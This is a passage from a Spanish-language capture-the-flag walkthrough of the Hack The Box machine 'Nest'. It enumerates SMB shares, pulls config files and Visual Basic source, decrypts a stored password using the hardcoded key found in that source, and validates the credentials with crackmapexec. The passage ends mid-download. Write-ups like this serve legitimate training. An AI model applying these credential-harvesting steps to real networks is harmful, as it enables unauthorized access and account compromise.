        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"Caret"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">blinkRate</span><span class="o">=</span><span class="s2">"250"</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"ScintillaGlobalSettings"</span> <span class="nv">enableMultiSelection</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"openSaveDir"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">defaultDirPath</span><span class="o">=</span><span class="s2">""</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"titleBar"</span> <span class="nv">short</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"DockingManager"</span> <span class="nv">leftWidth</span><span class="o">=</span><span class="s2">"200"</span> <span class="nv">rightWidth</span><span class="o">=</span><span class="s2">"200"</span> <span class="nv">topHeight</span><span class="o">=</span><span class="s2">"200"</span> <span class="nv">bottomHeight</span><span class="o">=</span><span class="s2">"266"</span><span class="o">&gt;</span>
            &lt;FloatingWindow <span class="nv">cont</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">x</span><span class="o">=</span><span class="s2">"39"</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"109"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"531"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"364"</span> /&gt;
            &lt;PluginDlg <span class="nv">pluginName</span><span class="o">=</span><span class="s2">"dummy"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">curr</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">prev</span><span class="o">=</span><span class="s2">"-1"</span> <span class="nv">isVisible</span><span class="o">=</span><span class="s2">"yes"</span> /&gt;
            &lt;PluginDlg <span class="nv">pluginName</span><span class="o">=</span><span class="s2">"NppConverter.dll"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">curr</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">prev</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">isVisible</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
            &lt;ActiveTabs <span class="nv">cont</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">activeTab</span><span class="o">=</span><span class="s2">"-1"</span> /&gt;
            &lt;ActiveTabs <span class="nv">cont</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">activeTab</span><span class="o">=</span><span class="s2">"-1"</span> /&gt;
            &lt;ActiveTabs <span class="nv">cont</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">activeTab</span><span class="o">=</span><span class="s2">"-1"</span> /&gt;
            &lt;ActiveTabs <span class="nv">cont</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">activeTab</span><span class="o">=</span><span class="s2">"-1"</span> /&gt;
        &lt;/GUIConfig&gt;
    &lt;/GUIConfigs&gt;
    &lt;<span class="o">!</span><span class="nt">--</span> The History of opened files list <span class="nt">--</span><span class="o">&gt;</span>
    &lt;FindHistory <span class="nv">nbMaxFindHistoryPath</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">nbMaxFindHistoryFilter</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">nbMaxFindHistoryFind</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">nbMaxFindHistoryReplace</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">matchWord</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">matchCase</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">wrap</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">directionDown</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">fifRecuisive</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">fifInHiddenFolder</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">dlgAlwaysVisible</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">fifFilterFollowsDoc</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">fifFolderFollowsDoc</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">searchMode</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">transparencyMode</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">transparency</span><span class="o">=</span><span class="s2">"150"</span><span class="o">&gt;</span>
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"text"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"txt"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"itx"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"iTe"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"IEND"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"redeem"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"activa"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"activate"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"redeem on"</span> /&gt;
        &lt;Find <span class="nv">name</span><span class="o">=</span><span class="s2">"192"</span> /&gt;
        &lt;Replace <span class="nv">name</span><span class="o">=</span><span class="s2">"C_addEvent"</span> /&gt;
    &lt;/FindHistory&gt;
    &lt;History <span class="nv">nbMaxFile</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">inSubMenu</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">customLength</span><span class="o">=</span><span class="s2">"-1"</span><span class="o">&gt;</span>
        &lt;File <span class="nv">filename</span><span class="o">=</span><span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\d</span><span class="s2">rivers</span><span class="se">\e</span><span class="s2">tc</span><span class="se">\h</span><span class="s2">osts"</span> /&gt;
        &lt;File <span class="nv">filename</span><span class="o">=</span><span class="s2">"</span><span class="se">\\</span><span class="s2">HTB-NEST</span><span class="se">\S</span><span class="s2">ecure</span><span class="nv">$\</span><span class="s2">IT</span><span class="se">\C</span><span class="s2">arl</span><span class="se">\T</span><span class="s2">emp.txt"</span> /&gt;
        &lt;File <span class="nv">filename</span><span class="o">=</span><span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\C</span><span class="s2">.Smith</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\t</span><span class="s2">odo.txt"</span> /&gt;
    &lt;/History&gt;
&lt;/NotepadPlus&gt;

❯ <span class="nb">cat </span>RU_config.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span>?&gt;
&lt;ConfigFile xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns:xsd<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema"</span><span class="o">&gt;</span>
  &lt;Port&gt;389&lt;/Port&gt;
  &lt;Username&gt;c.smith&lt;/Username&gt;
  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE<span class="o">=</span>&lt;/Password&gt;
&lt;/ConfigFile&gt;
</code></pre></div></div>

<p>Aqui ya tenemos algunas cosas muy interesantes, primero que bajo el directorio <strong>Secure$</strong> existen recursos a los cuales podríamos acceder aunque no tengamos permisos de ver el contenido del directorio <strong>IT</strong> y otra cosa es que tenemos una posible contraseña del usuario <strong>c.smith</strong>. Vamos con la primera parte:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Secure<span class="nv">$ </span><span class="nt">-U</span> <span class="s1">'TempUser'</span>
Enter WORKGROUP<span class="se">\T</span>empUser<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Wed Aug  7 18:08:12 2019
  ..                                  D        0  Wed Aug  7 18:08:12 2019
  Finance                             D        0  Wed Aug  7 14:40:13 2019
  HR                                  D        0  Wed Aug  7 18:08:11 2019
  IT                                  D        0  Thu Aug  8 05:59:25 2019

                5242623 blocks of size 4096. 1839999 blocks available
smb: \&gt; cd IT\
smb: \IT\&gt; dir
NT_STATUS_ACCESS_DENIED listing \IT\*
smb: \IT\&gt; cd Carl
smb: \IT\Carl\&gt; dir
  .                                   D        0  Wed Aug  7 14:42:14 2019
  ..                                  D        0  Wed Aug  7 14:42:14 2019
  Docs                                D        0  Wed Aug  7 14:44:00 2019
  Reports                             D        0  Tue Aug  6 08:45:40 2019
  VB Projects                         D        0  Tue Aug  6 09:41:55 2019

                5242623 blocks of size 4096. 1839999 blocks available
smb: \IT\Carl\&gt;
</span></code></pre></div></div>

<p>Efectivamente, podemos ver contenido bajo el recurso <code class="language-plaintext highlighter-rouge">Secure$\IT\Carl</code>; por lo tanto, nos traemos lo que encontramos con <code class="language-plaintext highlighter-rouge">smbget</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbget <span class="nt">-rR</span> smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl/ <span class="nt">-U</span> <span class="s1">'TempUser'</span>
Password <span class="k">for</span> <span class="o">[</span>TempUser] connecting to //Secure<span class="nv">$/</span>10.10.10.178: 
Using workgroup WORKGROUP, user TempUser
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//Docs/ip.txt                                                                                  
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//Docs/mmc.txt                                                                                 
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/ConfigFile.vb                                                   
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/Module1.vb                                                      
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb                              
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.myapp                                    
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb                                      
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb                                
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                                       
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb                                 
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.settings                                    
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                                               
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                                          
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                                               
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner/Utils.vb                                                        
smb://10.10.10.178/Secure<span class="nv">$/</span>IT/Carl//VB Projects/WIP/RU/RUScanner.sln                                                             
Downloaded 25.18kB <span class="k">in </span>25 seconds
</code></pre></div></div>

<p>Vamos a echarles un ojo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tree                    
<span class="nb">.</span>                            
├── credentials.txt   
├── Docs                     
│   ├── ip.txt            
│   └── mmc.txt 
├── IT         
│   ├── Archive
│   ├── Configs           
│   │   ├── Adobe        
│   │   │   ├── editing.xml
│   │   │   ├── Options.txt
│   │   │   ├── projects.xml
│   │   │   └── settings.xml
│   │   ├── Atlas                                               
│   │   │   └── Temp.XML
│   │   ├── DLink
│   │   ├── Microsoft                                           
│   │   │   └── Options.xml
│   │   ├── NotepadPlusPlus
│   │   │   ├── config.xml
│   │   │   └── shortcuts.xml
│   │   ├── RU Scanner
│   │   │   └── RU_config.xml
│   │   └── Server Manager
│   ├── Installs             
│   ├── Reports                
│   └── Tools                                                   
├── Maintenance Alerts.txt    
├── New Text Document.txt     
├── Production                                                  
├── Reports                                                     
├── Shared                                                      
│   ├── Maintenance                                             
│   │   └── Maintenance Alerts.txt    
│   └── Templates                                               
│       ├── HR                                                  
│       │   └── Welcome Email.txt
│       └── Marketing
├── VB Projects
│   ├── Production
│   └── WIP
│       └── RU
│           ├── RUScanner
│           │   ├── bin
│           │   │   ├── Debug
│           │   │   └── Release
│           │   ├── ConfigFile.vb
│           │   ├── Module1.vb
│           │   ├── My Project
│           │   │   ├── Application.Designer.vb
│           │   │   ├── Application.myapp
│           │   │   ├── AssemblyInfo.vb
│           │   │   ├── Resources.Designer.vb
│           │   │   ├── Resources.resx
│           │   │   ├── Settings.Designer.vb
│           │   │   └── Settings.settings
│           │   ├── obj
│           │   │   └── x86
│           │   ├── RU Scanner.vbproj
│           │   ├── RU Scanner.vbproj.user
│           │   ├── SsoIntegration.vb
│           │   └── Utils.vb
│           └── RUScanner.sln
└── Welcome Email.txt

32 directories, 31 files
</code></pre></div></div>

<p>Tenemos el directorio <strong>VB Projects</strong> en el cual se observan archivo de extension <strong><em>vb</em></strong> relacionados con <strong><em>Visual Basic</em></strong> y como siempre vamos a echarles un ojo empezando por aquellos que puedan tener credenciales, como <code class="language-plaintext highlighter-rouge">ConfigFile.vb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>ConfigFile.vb
───────┬───────────────────────────────────────────────────────────────────────────────────
       │ File: ConfigFile.vb
───────┼───────────────────────────────────────────────────────────────────────────────────
   1   │ ﻿Public Class ConfigFile
   2   │ 
   3   │     Public Property Port As Integer
   4   │     Public Property Username As String
   5   │     Public Property Password As String
   6   │ 
   7   │     Public Sub SaveToFile<span class="o">(</span>Path As String<span class="o">)</span>
   8   │         Using File As New IO.FileStream<span class="o">(</span>Path, IO.FileMode.Create<span class="o">)</span>
   9   │             Dim Writer As New Xml.Serialization.XmlSerializer<span class="o">(</span>GetType<span class="o">(</span>ConfigFile<span class="o">))</span>
  10   │             Writer.Serialize<span class="o">(</span>File, Me<span class="o">)</span>
  11   │         End Using
  12   │     End Sub
  13   │ 
  14   │     Public Shared Function LoadFromFile<span class="o">(</span>ByVal FilePath As String<span class="o">)</span> As ConfigFile
  15   │         Using File As New IO.FileStream<span class="o">(</span>FilePath, IO.FileMode.Open<span class="o">)</span>
  16   │             Dim Reader As New Xml.Serialization.XmlSerializer<span class="o">(</span>GetType<span class="o">(</span>ConfigFile<span class="o">))</span>
  17   │             Return DirectCast<span class="o">(</span>Reader.Deserialize<span class="o">(</span>File<span class="o">)</span>, ConfigFile<span class="o">)</span>
  18   │         End Using
  19   │     End Function
  20   │ 
  21   │ 
  22   │ End Class
───────┴───────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<p>No vemos nada interesante, así que empezaremos a ver los otros archivos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>Module1.vb
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Module1.vb
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ﻿Module Module1
   2   │ 
   3   │     Sub Main<span class="o">()</span>
   4   │         Dim Config As ConfigFile <span class="o">=</span> ConfigFile.LoadFromFile<span class="o">(</span><span class="s2">"RU_Config.xml"</span><span class="o">)</span>
   5   │         Dim <span class="nb">test </span>As New SsoIntegration With <span class="o">{</span>.Username <span class="o">=</span> Config.Username, .Password <span class="o">=</span> Utils.DecryptString<span class="o">(</span>Config.Passwor
       │ d<span class="o">)}</span>
   6   │        
   7   │ 
   8   │ 
   9   │     End Sub
  10   │ 
  11   │ End Module
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<p>En este archivo <code class="language-plaintext highlighter-rouge">Module1.vb</code> vemos que hace referencia a otro archivo que se nos hace familiar <code class="language-plaintext highlighter-rouge">RU_Config.xml</code> el cual contiene el nombre usuario <strong>C.Smith</strong> y un password que se encuentra cifrado y curiosamente este archivo hace uso de una función bajo <code class="language-plaintext highlighter-rouge">Utils</code> que descifra una cadena de texto; por lo tanto, vemos que existe un archivo llamado <code class="language-plaintext highlighter-rouge">Utils.vb</code> en el cual debe de contener la función <code class="language-plaintext highlighter-rouge">DecryptString</code> con la cual podemos descifrar la contraseña. Para trabajar mejor, vamos a hacer uso de la herramienta online <a href="https://dotnetfiddle.net/">dotnetfiddle</a> y vamos a pegar el contenido del archivo <code class="language-plaintext highlighter-rouge">Utils.vb</code> dejando sólo aquello que nos interesa y realizando unas modificaciones para que nos muestre el resultado en texto claro.</p>

<p><img src="/assets/images/htb-nest/nest-decrypter.png" alt="" /></p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Imports</span> <span class="nn">System.Text</span>
<span class="k">Imports</span> <span class="nn">System.Security.Cryptography</span>
<span class="k">Imports</span> <span class="nn">System</span>
<span class="k">Public</span> <span class="k">Class</span> <span class="nc">Utils</span>

    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="n">EncryptedString</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="k">If</span> <span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span> <span class="k">Then</span>
            <span class="k">Return</span> <span class="kt">String</span><span class="p">.</span><span class="n">Empty</span>
        <span class="k">Else</span>
            <span class="k">Return</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span> <span class="s">"N3st22"</span><span class="p">,</span> <span class="s">"88552299"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
        <span class="k">End</span> <span class="k">If</span>
    <span class="k">End</span> <span class="k">Function</span>

    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">cipherText</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">passPhrase</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">saltValue</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                    <span class="k">ByVal</span> <span class="n">passwordIterations</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">initVector</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="n">_</span>
                                   <span class="k">ByVal</span> <span class="n">keySize</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">)</span> <span class="n">_</span>
                           <span class="ow">As</span> <span class="kt">String</span>

        <span class="k">Dim</span> <span class="nv">initVectorBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">initVectorBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">saltValueBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">saltValueBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">cipherTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">cipherTextBytes</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">password</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">saltValueBytes</span><span class="p">,</span> <span class="n">_</span>
                                           <span class="n">passwordIterations</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">keyBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="n">keyBytes</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span> <span class="o">/</span> <span class="mi">8</span><span class="p">))</span>

        <span class="k">Dim</span> <span class="nv">symmetricKey</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">AesCryptoServiceProvider</span>
        <span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span>

        <span class="k">Dim</span> <span class="nv">decryptor</span> <span class="ow">As</span> <span class="n">ICryptoTransform</span>
        <span class="n">decryptor</span> <span class="o">=</span> <span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span> <span class="n">initVectorBytes</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">memoryStream</span> <span class="ow">As</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
        <span class="n">memoryStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">cryptoStream</span> <span class="ow">As</span> <span class="n">CryptoStream</span>
        <span class="n">cryptoStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">_</span>
                                        <span class="n">decryptor</span><span class="p">,</span> <span class="n">_</span>
                                        <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">plainTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
        <span class="k">ReDim</span> <span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>

        <span class="k">Dim</span> <span class="nv">decryptedByteCount</span> <span class="ow">As</span> <span class="kt">Integer</span>
        <span class="n">decryptedByteCount</span> <span class="o">=</span> <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="n">_</span>
                                               <span class="mi">0</span><span class="p">,</span> <span class="n">_</span>
                                               <span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>

        <span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
        <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

        <span class="k">Dim</span> <span class="nv">plainText</span> <span class="ow">As</span> <span class="kt">String</span>
        <span class="n">plainText</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="mi">0</span><span class="p">,</span> <span class="n">_</span>
                                            <span class="n">decryptedByteCount</span><span class="p">)</span>
		<span class="n">System</span><span class="p">.</span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">plainText</span><span class="p">)</span>
        <span class="k">Return</span> <span class="n">plainText</span>
    <span class="k">End</span> <span class="k">Function</span>
	
	<span class="k">Public</span> <span class="k">Class</span> <span class="nc">SsoIntegration</span>
		<span class="k">Public</span> <span class="k">Property</span> <span class="nf">Username</span> <span class="ow">As</span> <span class="kt">String</span>
			<span class="k">Public</span> <span class="k">Property</span> <span class="nf">Password</span> <span class="ow">As</span> <span class="kt">String</span>
	<span class="k">End</span> <span class="k">Class</span>
	
	<span class="k">Sub</span> <span class="nf">Main</span><span class="p">()</span>
		<span class="k">Dim</span> <span class="nv">test</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">SsoIntegration</span> <span class="k">With</span> <span class="p">{.</span><span class="n">Username</span> <span class="o">=</span> <span class="s">"c.smith"</span><span class="p">,</span> <span class="p">.</span><span class="n">Password</span> <span class="o">=</span> <span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="s">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="p">)}</span>
	<span class="k">End</span> <span class="k">Sub</span>
			
<span class="k">End</span> <span class="k">Class</span>
</code></pre></div></div>

<p>Y tenemos las credenciales del usuario <strong>c.smith</strong> así que las validamos con <code class="language-plaintext highlighter-rouge">crackmapexec smb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.178 <span class="nt">-u</span> <span class="s1">'c.smith'</span> <span class="nt">-p</span> <span class="s1">'xRxRxPANCAK3SxRxRx'</span>
SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:HTB-NEST<span class="o">)</span> <span class="o">(</span>domain:HTB-NEST<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] HTB-NEST<span class="se">\c</span>.smith:xRxRxPANCAK3SxRxRx
</code></pre></div></div>

<p>De igual forma, vamos a validar con las nuevas credenciales si existen nuevos recursos a los cuales tengamos acceso y empezaremos con el directorio del usuario <strong>C.Smith</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Users <span class="nt">-U</span> <span class="s1">'c.smith'</span>
Enter WORKGROUP<span class="se">\c</span>.smith<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Jan 25 17:04:21 2020
  ..                                  D        0  Sat Jan 25 17:04:21 2020
  Administrator                       D        0  Fri Aug  9 10:08:23 2019
  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
  L.Frost                             D        0  Thu Aug  8 12:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 12:02:50 2019
  TempUser                            D        0  Wed Aug  7 17:55:56 2019

                5242623 blocks of size 4096. 1839999 blocks available
smb: \&gt; cd C.Smith
smb: \C.Smith\&gt; dir
  .                                   D        0  Sun Jan 26 01:21:44 2020
  ..                                  D        0  Sun Jan 26 01:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 18:06:17 2019
  user.txt                            A       34  Fri Jan 14 16:58:31 2022

                5242623 blocks of size 4096. 1839999 blocks available
smb: \C.Smith\&gt; 
</span></code></pre></div></div>

<p>Aqui ya vemos la flag (user.txt) pero no vamos a leerla hasta que tengamos acceso a la máquina, así que pasaremos al directorio <strong>HQK Reporting</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> recurse on
smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Jan 26 01:21:44 2020
  ..                                  D        0  Sun Jan 26 01:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 18:06:17 2019
  user.txt                            A       34  Fri Jan 14 16:58:31 2022

<span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting
  <span class="nb">.</span>                                   D        0  Thu Aug  8 18:06:17 2019
  ..                                  D        0  Thu Aug  8 18:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 07:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 18:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 18:09:05 2019

<span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module
  <span class="nb">.</span>                                   D        0  Fri Aug  9 07:18:42 2019
  ..                                  D        0  Fri Aug  9 07:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 18:41:16 2019

                5242623 blocks of size 4096. 1839871 blocks available
smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span>
</code></pre></div></div>

<p>Tenemos algunos archivos que vamos a transferiornos a nuestra máquina de atacante.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> prompt off
smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> mget <span class="k">*</span>
